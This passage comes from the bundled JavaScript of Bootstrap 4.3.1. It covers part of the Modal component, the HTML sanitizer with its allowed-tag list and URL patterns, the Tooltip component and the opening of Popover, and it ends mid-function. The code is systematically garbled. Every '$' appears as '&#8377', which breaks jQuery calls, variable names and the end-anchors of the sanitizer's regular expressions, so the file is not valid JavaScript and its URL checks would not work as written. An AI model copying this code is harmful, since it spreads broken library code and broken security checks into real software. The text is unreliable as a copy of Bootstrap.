            if (event.which === ESCAPE_KEYCODE&#83771) {
              event.preventDefault();

              _this5.hide();
            }
          });
        } else if (!this._isShown) {
          &#8377(this._element).off(Event&#83775.KEYDOWN_DISMISS);
        }
      };

      _proto._setResizeEvent = function _setResizeEvent() {
        var _this6 = this;

        if (this._isShown) {
          &#8377(window).on(Event&#83775.RESIZE, function (event) {
            return _this6.handleUpdate(event);
          });
        } else {
          &#8377(window).off(Event&#83775.RESIZE);
        }
      };

      _proto._hideModal = function _hideModal() {
        var _this7 = this;

        this._element.style.display = 'none';

        this._element.setAttribute('aria-hidden', true);

        this._element.removeAttribute('aria-modal');

        this._isTransitioning = false;

        this._showBackdrop(function () {
          &#8377(document.body).removeClass(ClassName&#83775.OPEN);

          _this7._resetAdjustments();

          _this7._resetScrollbar();

          &#8377(_this7._element).trigger(Event&#83775.HIDDEN);
        });
      };

      _proto._removeBackdrop = function _removeBackdrop() {
        if (this._backdrop) {
          &#8377(this._backdrop).remove();
          this._backdrop = null;
        }
      };

      _proto._showBackdrop = function _showBackdrop(callback) {
        var _this8 = this;

        var animate = &#8377(this._element).hasClass(ClassName&#83775.FADE) ? ClassName&#83775.FADE : '';

        if (this._isShown && this._config.backdrop) {
          this._backdrop = document.createElement('div');
          this._backdrop.className = ClassName&#83775.BACKDROP;

          if (animate) {
            this._backdrop.classList.add(animate);
          }

          &#8377(this._backdrop).appendTo(document.body);
          &#8377(this._element).on(Event&#83775.CLICK_DISMISS, function (event) {
            if (_this8._ignoreBackdropClick) {
              _this8._ignoreBackdropClick = false;
              return;
            }

            if (event.target !== event.currentTarget) {
              return;
            }

            if (_this8._config.backdrop === 'static') {
              _this8._element.focus();
            } else {
              _this8.hide();
            }
          });

          if (animate) {
            Util.reflow(this._backdrop);
          }

          &#8377(this._backdrop).addClass(ClassName&#83775.SHOW);

          if (!callback) {
            return;
          }

          if (!animate) {
            callback();
            return;
          }

          var backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);
          &#8377(this._backdrop).one(Util.TRANSITION_END, callback).emulateTransitionEnd(backdropTransitionDuration);
        } else if (!this._isShown && this._backdrop) {
          &#8377(this._backdrop).removeClass(ClassName&#83775.SHOW);

          var callbackRemove = function callbackRemove() {
            _this8._removeBackdrop();

            if (callback) {
              callback();
            }
          };

          if (&#8377(this._element).hasClass(ClassName&#83775.FADE)) {
            var _backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);

            &#8377(this._backdrop).one(Util.TRANSITION_END, callbackRemove).emulateTransitionEnd(_backdropTransitionDuration);
          } else {
            callbackRemove();
          }
        } else if (callback) {
          callback();
        }
      } // ----------------------------------------------------------------------
      // the following methods are used to handle overflowing modals
      // todo (fat): these should probably be refactored out of modal.js
      // ----------------------------------------------------------------------
      ;

      _proto._adjustDialog = function _adjustDialog() {
        var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;

        if (!this._isBodyOverflowing && isModalOverflowing) {
          this._element.style.paddingLeft = this._scrollbarWidth + "px";
        }

        if (this._isBodyOverflowing && !isModalOverflowing) {
          this._element.style.paddingRight = this._scrollbarWidth + "px";
        }
      };

      _proto._resetAdjustments = function _resetAdjustments() {
        this._element.style.paddingLeft = '';
        this._element.style.paddingRight = '';
      };

      _proto._checkScrollbar = function _checkScrollbar() {
        var rect = document.body.getBoundingClientRect();
        this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;
        this._scrollbarWidth = this._getScrollbarWidth();
      };

      _proto._setScrollbar = function _setScrollbar() {
        var _this9 = this;

        if (this._isBodyOverflowing) {
          // Note: DOMNode.style.paddingRight returns the actual value or '' if not set
          //   while &#8377(DOMNode).css('padding-right') returns the calculated value or 0 if not set
          var fixedContent = [].slice.call(document.querySelectorAll(Selector&#83775.FIXED_CONTENT));
          var stickyContent = [].slice.call(document.querySelectorAll(Selector&#83775.STICKY_CONTENT)); // Adjust fixed content padding

          &#8377(fixedContent).each(function (index, element) {
            var actualPadding = element.style.paddingRight;
            var calculatedPadding = &#8377(element).css('padding-right');
            &#8377(element).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + _this9._scrollbarWidth + "px");
          }); // Adjust sticky content margin

          &#8377(stickyContent).each(function (index, element) {
            var actualMargin = element.style.marginRight;
            var calculatedMargin = &#8377(element).css('margin-right');
            &#8377(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) - _this9._scrollbarWidth + "px");
          }); // Adjust body padding

          var actualPadding = document.body.style.paddingRight;
          var calculatedPadding = &#8377(document.body).css('padding-right');
          &#8377(document.body).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + this._scrollbarWidth + "px");
        }

        &#8377(document.body).addClass(ClassName&#83775.OPEN);
      };

      _proto._resetScrollbar = function _resetScrollbar() {
        // Restore fixed content padding
        var fixedContent = [].slice.call(document.querySelectorAll(Selector&#83775.FIXED_CONTENT));
        &#8377(fixedContent).each(function (index, element) {
          var padding = &#8377(element).data('padding-right');
          &#8377(element).removeData('padding-right');
          element.style.paddingRight = padding ? padding : '';
        }); // Restore sticky content

        var elements = [].slice.call(document.querySelectorAll("" + Selector&#83775.STICKY_CONTENT));
        &#8377(elements).each(function (index, element) {
          var margin = &#8377(element).data('margin-right');

          if (typeof margin !== 'undefined') {
            &#8377(element).css('margin-right', margin).removeData('margin-right');
          }
        }); // Restore body padding

        var padding = &#8377(document.body).data('padding-right');
        &#8377(document.body).removeData('padding-right');
        document.body.style.paddingRight = padding ? padding : '';
      };

      _proto._getScrollbarWidth = function _getScrollbarWidth() {
        // thx d.walsh
        var scrollDiv = document.createElement('div');
        scrollDiv.className = ClassName&#83775.SCROLLBAR_MEASURER;
        document.body.appendChild(scrollDiv);
        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      } // Static
      ;

      Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83775);

          var _config = _objectSpread({}, Default&#83773, &#8377(this).data(), typeof config === 'object' && config ? config : {});

          if (!data) {
            data = new Modal(this, _config);
            &#8377(this).data(DATA_KEY&#83775, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config](relatedTarget);
          } else if (_config.show) {
            data.show(relatedTarget);
          }
        });
      };

      _createClass(Modal, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83775;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83773;
        }
      }]);

      return Modal;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  &#8377(document).on(Event&#83775.CLICK_DATA_API, Selector&#83775.DATA_TOGGLE, function (event) {
    var _this10 = this;

    var target;
    var selector = Util.getSelectorFromElement(this);

    if (selector) {
      target = document.querySelector(selector);
    }

    var config = &#8377(target).data(DATA_KEY&#83775) ? 'toggle' : _objectSpread({}, &#8377(target).data(), &#8377(this).data());

    if (this.tagName === 'A' || this.tagName === 'AREA') {
      event.preventDefault();
    }

    var &#8377target = &#8377(target).one(Event&#83775.SHOW, function (showEvent) {
      if (showEvent.isDefaultPrevented()) {
        // Only register focus restorer if modal will actually get shown
        return;
      }

      &#8377target.one(Event&#83775.HIDDEN, function () {
        if (&#8377(_this10).is(':visible')) {
          _this10.focus();
        }
      });
    });

    Modal._jQueryInterface.call(&#8377(target), config, this);
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  &#8377.fn[NAME&#83775] = Modal._jQueryInterface;
  &#8377.fn[NAME&#83775].Constructor = Modal;

  &#8377.fn[NAME&#83775].noConflict = function () {
    &#8377.fn[NAME&#83775] = JQUERY_NO_CONFLICT&#83775;
    return Modal._jQueryInterface;
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): tools/sanitizer.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  var uriAttrs = ['background', 'cite', 'href', 'itemtype', 'longdesc', 'poster', 'src', 'xlink:href'];
  var ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*&#8377/i;
  var DefaultWhitelist = {
    // Global attributes allowed on any supplied element below.
    '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],
    a: ['target', 'href', 'title', 'rel'],
    area: [],
    b: [],
    br: [],
    col: [],
    code: [],
    div: [],
    em: [],
    hr: [],
    h1: [],
    h2: [],
    h3: [],
    h4: [],
    h5: [],
    h6: [],
    i: [],
    img: ['src', 'alt', 'title', 'width', 'height'],
    li: [],
    ol: [],
    p: [],
    pre: [],
    s: [],
    small: [],
    span: [],
    sub: [],
    sup: [],
    strong: [],
    u: [],
    ul: []
    /**
     * A pattern that recognizes a commonly useful subset of URLs that are safe.
     *
     * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
     */

  };
  var SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|&#8377))/gi;
  /**
   * A pattern that matches safe data URLs. Only matches image, video and audio types.
   *
   * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
   */

  var DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*&#8377/i;

  function allowedAttribute(attr, allowedAttributeList) {
    var attrName = attr.nodeName.toLowerCase();

    if (allowedAttributeList.indexOf(attrName) !== -1) {
      if (uriAttrs.indexOf(attrName) !== -1) {
        return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN));
      }

      return true;
    }

    var regExp = allowedAttributeList.filter(function (attrRegex) {
      return attrRegex instanceof RegExp;
    }); // Check if a regular expression validates the attribute.

    for (var i = 0, l = regExp.length; i < l; i++) {
      if (attrName.match(regExp[i])) {
        return true;
      }
    }

    return false;
  }

  function sanitizeHtml(unsafeHtml, whiteList, sanitizeFn) {
    if (unsafeHtml.length === 0) {
      return unsafeHtml;
    }

    if (sanitizeFn && typeof sanitizeFn === 'function') {
      return sanitizeFn(unsafeHtml);
    }

    var domParser = new window.DOMParser();
    var createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');
    var whitelistKeys = Object.keys(whiteList);
    var elements = [].slice.call(createdDocument.body.querySelectorAll('*'));

    var _loop = function _loop(i, len) {
      var el = elements[i];
      var elName = el.nodeName.toLowerCase();

      if (whitelistKeys.indexOf(el.nodeName.toLowerCase()) === -1) {
        el.parentNode.removeChild(el);
        return "continue";
      }

      var attributeList = [].slice.call(el.attributes);
      var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);
      attributeList.forEach(function (attr) {
        if (!allowedAttribute(attr, whitelistedAttributes)) {
          el.removeAttribute(attr.nodeName);
        }
      });
    };

    for (var i = 0, len = elements.length; i < len; i++) {
      var _ret = _loop(i, len);

      if (_ret === "continue") continue;
    }

    return createdDocument.body.innerHTML;
  }

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83776 = 'tooltip';
  var VERSION&#83776 = '4.3.1';
  var DATA_KEY&#83776 = 'bs.tooltip';
  var EVENT_KEY&#83776 = "." + DATA_KEY&#83776;
  var JQUERY_NO_CONFLICT&#83776 = &#8377.fn[NAME&#83776];
  var CLASS_PREFIX = 'bs-tooltip';
  var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');
  var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];
  var DefaultType&#83774 = {
    animation: 'boolean',
    template: 'string',
    title: '(string|element|function)',
    trigger: 'string',
    delay: '(number|object)',
    html: 'boolean',
    selector: '(string|boolean)',
    placement: '(string|function)',
    offset: '(number|string|function)',
    container: '(string|element|boolean)',
    fallbackPlacement: '(string|array)',
    boundary: '(string|element)',
    sanitize: 'boolean',
    sanitizeFn: '(null|function)',
    whiteList: 'object'
  };
  var AttachmentMap&#83771 = {
    AUTO: 'auto',
    TOP: 'top',
    RIGHT: 'right',
    BOTTOM: 'bottom',
    LEFT: 'left'
  };
  var Default&#83774 = {
    animation: true,
    template: '<div class="tooltip" role="tooltip">' + '<div class="arrow"></div>' + '<div class="tooltip-inner"></div></div>',
    trigger: 'hover focus',
    title: '',
    delay: 0,
    html: false,
    selector: false,
    placement: 'top',
    offset: 0,
    container: false,
    fallbackPlacement: 'flip',
    boundary: 'scrollParent',
    sanitize: true,
    sanitizeFn: null,
    whiteList: DefaultWhitelist
  };
  var HoverState = {
    SHOW: 'show',
    OUT: 'out'
  };
  var Event&#83776 = {
    HIDE: "hide" + EVENT_KEY&#83776,
    HIDDEN: "hidden" + EVENT_KEY&#83776,
    SHOW: "show" + EVENT_KEY&#83776,
    SHOWN: "shown" + EVENT_KEY&#83776,
    INSERTED: "inserted" + EVENT_KEY&#83776,
    CLICK: "click" + EVENT_KEY&#83776,
    FOCUSIN: "focusin" + EVENT_KEY&#83776,
    FOCUSOUT: "focusout" + EVENT_KEY&#83776,
    MOUSEENTER: "mouseenter" + EVENT_KEY&#83776,
    MOUSELEAVE: "mouseleave" + EVENT_KEY&#83776
  };
  var ClassName&#83776 = {
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector&#83776 = {
    TOOLTIP: '.tooltip',
    TOOLTIP_INNER: '.tooltip-inner',
    ARROW: '.arrow'
  };
  var Trigger = {
    HOVER: 'hover',
    FOCUS: 'focus',
    CLICK: 'click',
    MANUAL: 'manual'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Tooltip =
    /*#__PURE__*/
    function () {
      function Tooltip(element, config) {
        /**
         * Check for Popper dependency
         * Popper - https://popper.js.org
         */
        if (typeof Popper === 'undefined') {
          throw new TypeError('Bootstrap\'s tooltips require Popper.js (https://popper.js.org/)');
        } // private


        this._isEnabled = true;
        this._timeout = 0;
        this._hoverState = '';
        this._activeTrigger = {};
        this._popper = null; // Protected

        this.element = element;
        this.config = this._getConfig(config);
        this.tip = null;

        this._setListeners();
      } // Getters


      var _proto = Tooltip.prototype;

      // Public
      _proto.enable = function enable() {
        this._isEnabled = true;
      };

      _proto.disable = function disable() {
        this._isEnabled = false;
      };

      _proto.toggleEnabled = function toggleEnabled() {
        this._isEnabled = !this._isEnabled;
      };

      _proto.toggle = function toggle(event) {
        if (!this._isEnabled) {
          return;
        }

        if (event) {
          var dataKey = this.constructor.DATA_KEY;
          var context = &#8377(event.currentTarget).data(dataKey);

          if (!context) {
            context = new this.constructor(event.currentTarget, this._getDelegateConfig());
            &#8377(event.currentTarget).data(dataKey, context);
          }

          context._activeTrigger.click = !context._activeTrigger.click;

          if (context._isWithActiveTrigger()) {
            context._enter(null, context);
          } else {
            context._leave(null, context);
          }
        } else {
          if (&#8377(this.getTipElement()).hasClass(ClassName&#83776.SHOW)) {
            this._leave(null, this);

            return;
          }

          this._enter(null, this);
        }
      };

      _proto.dispose = function dispose() {
        clearTimeout(this._timeout);
        &#8377.removeData(this.element, this.constructor.DATA_KEY);
        &#8377(this.element).off(this.constructor.EVENT_KEY);
        &#8377(this.element).closest('.modal').off('hide.bs.modal');

        if (this.tip) {
          &#8377(this.tip).remove();
        }

        this._isEnabled = null;
        this._timeout = null;
        this._hoverState = null;
        this._activeTrigger = null;

        if (this._popper !== null) {
          this._popper.destroy();
        }

        this._popper = null;
        this.element = null;
        this.config = null;
        this.tip = null;
      };

      _proto.show = function show() {
        var _this = this;

        if (&#8377(this.element).css('display') === 'none') {
          throw new Error('Please use show on visible elements');
        }

        var showEvent = &#8377.Event(this.constructor.Event.SHOW);

        if (this.isWithContent() && this._isEnabled) {
          &#8377(this.element).trigger(showEvent);
          var shadowRoot = Util.findShadowRoot(this.element);
          var isInTheDom = &#8377.contains(shadowRoot !== null ? shadowRoot : this.element.ownerDocument.documentElement, this.element);

          if (showEvent.isDefaultPrevented() || !isInTheDom) {
            return;
          }

          var tip = this.getTipElement();
          var tipId = Util.getUID(this.constructor.NAME);
          tip.setAttribute('id', tipId);
          this.element.setAttribute('aria-describedby', tipId);
          this.setContent();

          if (this.config.animation) {
            &#8377(tip).addClass(ClassName&#83776.FADE);
          }

          var placement = typeof this.config.placement === 'function' ? this.config.placement.call(this, tip, this.element) : this.config.placement;

          var attachment = this._getAttachment(placement);

          this.addAttachmentClass(attachment);

          var container = this._getContainer();

          &#8377(tip).data(this.constructor.DATA_KEY, this);

          if (!&#8377.contains(this.element.ownerDocument.documentElement, this.tip)) {
            &#8377(tip).appendTo(container);
          }

          &#8377(this.element).trigger(this.constructor.Event.INSERTED);
          this._popper = new Popper(this.element, tip, {
            placement: attachment,
            modifiers: {
              offset: this._getOffset(),
              flip: {
                behavior: this.config.fallbackPlacement
              },
              arrow: {
                element: Selector&#83776.ARROW
              },
              preventOverflow: {
                boundariesElement: this.config.boundary
              }
            },
            onCreate: function onCreate(data) {
              if (data.originalPlacement !== data.placement) {
                _this._handlePopperPlacementChange(data);
              }
            },
            onUpdate: function onUpdate(data) {
              return _this._handlePopperPlacementChange(data);
            }
          });
          &#8377(tip).addClass(ClassName&#83776.SHOW); // If this is a touch-enabled device we add extra
          // empty mouseover listeners to the body's immediate children;
          // only needed because of broken event delegation on iOS
          // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html

          if ('ontouchstart' in document.documentElement) {
            &#8377(document.body).children().on('mouseover', null, &#8377.noop);
          }

          var complete = function complete() {
            if (_this.config.animation) {
              _this._fixTransition();
            }

            var prevHoverState = _this._hoverState;
            _this._hoverState = null;
            &#8377(_this.element).trigger(_this.constructor.Event.SHOWN);

            if (prevHoverState === HoverState.OUT) {
              _this._leave(null, _this);
            }
          };

          if (&#8377(this.tip).hasClass(ClassName&#83776.FADE)) {
            var transitionDuration = Util.getTransitionDurationFromElement(this.tip);
            &#8377(this.tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
          } else {
            complete();
          }
        }
      };

      _proto.hide = function hide(callback) {
        var _this2 = this;

        var tip = this.getTipElement();
        var hideEvent = &#8377.Event(this.constructor.Event.HIDE);

        var complete = function complete() {
          if (_this2._hoverState !== HoverState.SHOW && tip.parentNode) {
            tip.parentNode.removeChild(tip);
          }

          _this2._cleanTipClass();

          _this2.element.removeAttribute('aria-describedby');

          &#8377(_this2.element).trigger(_this2.constructor.Event.HIDDEN);

          if (_this2._popper !== null) {
            _this2._popper.destroy();
          }

          if (callback) {
            callback();
          }
        };

        &#8377(this.element).trigger(hideEvent);

        if (hideEvent.isDefaultPrevented()) {
          return;
        }

        &#8377(tip).removeClass(ClassName&#83776.SHOW); // If this is a touch-enabled device we remove the extra
        // empty mouseover listeners we added for iOS support

        if ('ontouchstart' in document.documentElement) {
          &#8377(document.body).children().off('mouseover', null, &#8377.noop);
        }

        this._activeTrigger[Trigger.CLICK] = false;
        this._activeTrigger[Trigger.FOCUS] = false;
        this._activeTrigger[Trigger.HOVER] = false;

        if (&#8377(this.tip).hasClass(ClassName&#83776.FADE)) {
          var transitionDuration = Util.getTransitionDurationFromElement(tip);
          &#8377(tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }

        this._hoverState = '';
      };

      _proto.update = function update() {
        if (this._popper !== null) {
          this._popper.scheduleUpdate();
        }
      } // Protected
      ;

      _proto.isWithContent = function isWithContent() {
        return Boolean(this.getTitle());
      };

      _proto.addAttachmentClass = function addAttachmentClass(attachment) {
        &#8377(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);
      };

      _proto.getTipElement = function getTipElement() {
        this.tip = this.tip || &#8377(this.config.template)[0];
        return this.tip;
      };

      _proto.setContent = function setContent() {
        var tip = this.getTipElement();
        this.setElementContent(&#8377(tip.querySelectorAll(Selector&#83776.TOOLTIP_INNER)), this.getTitle());
        &#8377(tip).removeClass(ClassName&#83776.FADE + " " + ClassName&#83776.SHOW);
      };

      _proto.setElementContent = function setElementContent(&#8377element, content) {
        if (typeof content === 'object' && (content.nodeType || content.jquery)) {
          // Content is a DOM node or a jQuery
          if (this.config.html) {
            if (!&#8377(content).parent().is(&#8377element)) {
              &#8377element.empty().append(content);
            }
          } else {
            &#8377element.text(&#8377(content).text());
          }

          return;
        }

        if (this.config.html) {
          if (this.config.sanitize) {
            content = sanitizeHtml(content, this.config.whiteList, this.config.sanitizeFn);
          }

          &#8377element.html(content);
        } else {
          &#8377element.text(content);
        }
      };

      _proto.getTitle = function getTitle() {
        var title = this.element.getAttribute('data-original-title');

        if (!title) {
          title = typeof this.config.title === 'function' ? this.config.title.call(this.element) : this.config.title;
        }

        return title;
      } // Private
      ;

      _proto._getOffset = function _getOffset() {
        var _this3 = this;

        var offset = {};

        if (typeof this.config.offset === 'function') {
          offset.fn = function (data) {
            data.offsets = _objectSpread({}, data.offsets, _this3.config.offset(data.offsets, _this3.element) || {});
            return data;
          };
        } else {
          offset.offset = this.config.offset;
        }

        return offset;
      };

      _proto._getContainer = function _getContainer() {
        if (this.config.container === false) {
          return document.body;
        }

        if (Util.isElement(this.config.container)) {
          return &#8377(this.config.container);
        }

        return &#8377(document).find(this.config.container);
      };

      _proto._getAttachment = function _getAttachment(placement) {
        return AttachmentMap&#83771[placement.toUpperCase()];
      };

      _proto._setListeners = function _setListeners() {
        var _this4 = this;

        var triggers = this.config.trigger.split(' ');
        triggers.forEach(function (trigger) {
          if (trigger === 'click') {
            &#8377(_this4.element).on(_this4.constructor.Event.CLICK, _this4.config.selector, function (event) {
              return _this4.toggle(event);
            });
          } else if (trigger !== Trigger.MANUAL) {
            var eventIn = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSEENTER : _this4.constructor.Event.FOCUSIN;
            var eventOut = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSELEAVE : _this4.constructor.Event.FOCUSOUT;
            &#8377(_this4.element).on(eventIn, _this4.config.selector, function (event) {
              return _this4._enter(event);
            }).on(eventOut, _this4.config.selector, function (event) {
              return _this4._leave(event);
            });
          }
        });
        &#8377(this.element).closest('.modal').on('hide.bs.modal', function () {
          if (_this4.element) {
            _this4.hide();
          }
        });

        if (this.config.selector) {
          this.config = _objectSpread({}, this.config, {
            trigger: 'manual',
            selector: ''
          });
        } else {
          this._fixTitle();
        }
      };

      _proto._fixTitle = function _fixTitle() {
        var titleType = typeof this.element.getAttribute('data-original-title');

        if (this.element.getAttribute('title') || titleType !== 'string') {
          this.element.setAttribute('data-original-title', this.element.getAttribute('title') || '');
          this.element.setAttribute('title', '');
        }
      };

      _proto._enter = function _enter(event, context) {
        var dataKey = this.constructor.DATA_KEY;
        context = context || &#8377(event.currentTarget).data(dataKey);

        if (!context) {
          context = new this.constructor(event.currentTarget, this._getDelegateConfig());
          &#8377(event.currentTarget).data(dataKey, context);
        }

        if (event) {
          context._activeTrigger[event.type === 'focusin' ? Trigger.FOCUS : Trigger.HOVER] = true;
        }

        if (&#8377(context.getTipElement()).hasClass(ClassName&#83776.SHOW) || context._hoverState === HoverState.SHOW) {
          context._hoverState = HoverState.SHOW;
          return;
        }

        clearTimeout(context._timeout);
        context._hoverState = HoverState.SHOW;

        if (!context.config.delay || !context.config.delay.show) {
          context.show();
          return;
        }

        context._timeout = setTimeout(function () {
          if (context._hoverState === HoverState.SHOW) {
            context.show();
          }
        }, context.config.delay.show);
      };

      _proto._leave = function _leave(event, context) {
        var dataKey = this.constructor.DATA_KEY;
        context = context || &#8377(event.currentTarget).data(dataKey);

        if (!context) {
          context = new this.constructor(event.currentTarget, this._getDelegateConfig());
          &#8377(event.currentTarget).data(dataKey, context);
        }

        if (event) {
          context._activeTrigger[event.type === 'focusout' ? Trigger.FOCUS : Trigger.HOVER] = false;
        }

        if (context._isWithActiveTrigger()) {
          return;
        }

        clearTimeout(context._timeout);
        context._hoverState = HoverState.OUT;

        if (!context.config.delay || !context.config.delay.hide) {
          context.hide();
          return;
        }

        context._timeout = setTimeout(function () {
          if (context._hoverState === HoverState.OUT) {
            context.hide();
          }
        }, context.config.delay.hide);
      };

      _proto._isWithActiveTrigger = function _isWithActiveTrigger() {
        for (var trigger in this._activeTrigger) {
          if (this._activeTrigger[trigger]) {
            return true;
          }
        }

        return false;
      };

      _proto._getConfig = function _getConfig(config) {
        var dataAttributes = &#8377(this.element).data();
        Object.keys(dataAttributes).forEach(function (dataAttr) {
          if (DISALLOWED_ATTRIBUTES.indexOf(dataAttr) !== -1) {
            delete dataAttributes[dataAttr];
          }
        });
        config = _objectSpread({}, this.constructor.Default, dataAttributes, typeof config === 'object' && config ? config : {});

        if (typeof config.delay === 'number') {
          config.delay = {
            show: config.delay,
            hide: config.delay
          };
        }

        if (typeof config.title === 'number') {
          config.title = config.title.toString();
        }

        if (typeof config.content === 'number') {
          config.content = config.content.toString();
        }

        Util.typeCheckConfig(NAME&#83776, config, this.constructor.DefaultType);

        if (config.sanitize) {
          config.template = sanitizeHtml(config.template, config.whiteList, config.sanitizeFn);
        }

        return config;
      };

      _proto._getDelegateConfig = function _getDelegateConfig() {
        var config = {};

        if (this.config) {
          for (var key in this.config) {
            if (this.constructor.Default[key] !== this.config[key]) {
              config[key] = this.config[key];
            }
          }
        }

        return config;
      };

      _proto._cleanTipClass = function _cleanTipClass() {
        var &#8377tip = &#8377(this.getTipElement());
        var tabClass = &#8377tip.attr('class').match(BSCLS_PREFIX_REGEX);

        if (tabClass !== null && tabClass.length) {
          &#8377tip.removeClass(tabClass.join(''));
        }
      };

      _proto._handlePopperPlacementChange = function _handlePopperPlacementChange(popperData) {
        var popperInstance = popperData.instance;
        this.tip = popperInstance.popper;

        this._cleanTipClass();

        this.addAttachmentClass(this._getAttachment(popperData.placement));
      };

      _proto._fixTransition = function _fixTransition() {
        var tip = this.getTipElement();
        var initConfigAnimation = this.config.animation;

        if (tip.getAttribute('x-placement') !== null) {
          return;
        }

        &#8377(tip).removeClass(ClassName&#83776.FADE);
        this.config.animation = false;
        this.hide();
        this.show();
        this.config.animation = initConfigAnimation;
      } // Static
      ;

      Tooltip._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = &#8377(this).data(DATA_KEY&#83776);

          var _config = typeof config === 'object' && config;

          if (!data && /dispose|hide/.test(config)) {
            return;
          }

          if (!data) {
            data = new Tooltip(this, _config);
            &#8377(this).data(DATA_KEY&#83776, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Tooltip, null, [{
        key: "VERSION",
        get: function get() {
          return VERSION&#83776;
        }
      }, {
        key: "Default",
        get: function get() {
          return Default&#83774;
        }
      }, {
        key: "NAME",
        get: function get() {
          return NAME&#83776;
        }
      }, {
        key: "DATA_KEY",
        get: function get() {
          return DATA_KEY&#83776;
        }
      }, {
        key: "Event",
        get: function get() {
          return Event&#83776;
        }
      }, {
        key: "EVENT_KEY",
        get: function get() {
          return EVENT_KEY&#83776;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultType&#83774;
        }
      }]);

      return Tooltip;
    }();
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  &#8377.fn[NAME&#83776] = Tooltip._jQueryInterface;
  &#8377.fn[NAME&#83776].Constructor = Tooltip;

  &#8377.fn[NAME&#83776].noConflict = function () {
    &#8377.fn[NAME&#83776] = JQUERY_NO_CONFLICT&#83776;
    return Tooltip._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAME&#83777 = 'popover';
  var VERSION&#83777 = '4.3.1';
  var DATA_KEY&#83777 = 'bs.popover';
  var EVENT_KEY&#83777 = "." + DATA_KEY&#83777;
  var JQUERY_NO_CONFLICT&#83777 = &#8377.fn[NAME&#83777];
  var CLASS_PREFIX&#83771 = 'bs-popover';
  var BSCLS_PREFIX_REGEX&#83771 = new RegExp("(^|\\s)" + CLASS_PREFIX&#83771 + "\\S+", 'g');

  var Default&#83775 = _objectSpread({}, Tooltip.Default, {
    placement: 'right',
    trigger: 'click',
    content: '',
    template: '<div class="popover" role="tooltip">' + '<div class="arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div></div>'
  });

  var DefaultType&#83775 = _objectSpread({}, Tooltip.DefaultType, {
    content: '(string|element|function)'
  });

  var ClassName&#83777 = {
    FADE: 'fade',
    SHOW: 'show'
  };
  var Selector&#83777 = {
    TITLE: '.popover-header',
    CONTENT: '.popover-body'
  };
  var Event&#83777 = {
    HIDE: "hide" + EVENT_KEY&#83777,
    HIDDEN: "hidden" + EVENT_KEY&#83777,
    SHOW: "show" + EVENT_KEY&#83777,
    SHOWN: "shown" + EVENT_KEY&#83777,
    INSERTED: "inserted" + EVENT_KEY&#83777,
    CLICK: "click" + EVENT_KEY&#83777,
    FOCUSIN: "focusin" + EVENT_KEY&#83777,
    FOCUSOUT: "focusout" + EVENT_KEY&#83777,
    MOUSEENTER: "mouseenter" + EVENT_KEY&#83777,
    MOUSELEAVE: "mouseleave" + EVENT_KEY&#83777
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Popover =
    /*#__PURE__*/
    function (_Tooltip) {
      _inheritsLoose(Popover, _Tooltip);

      function Popover() {
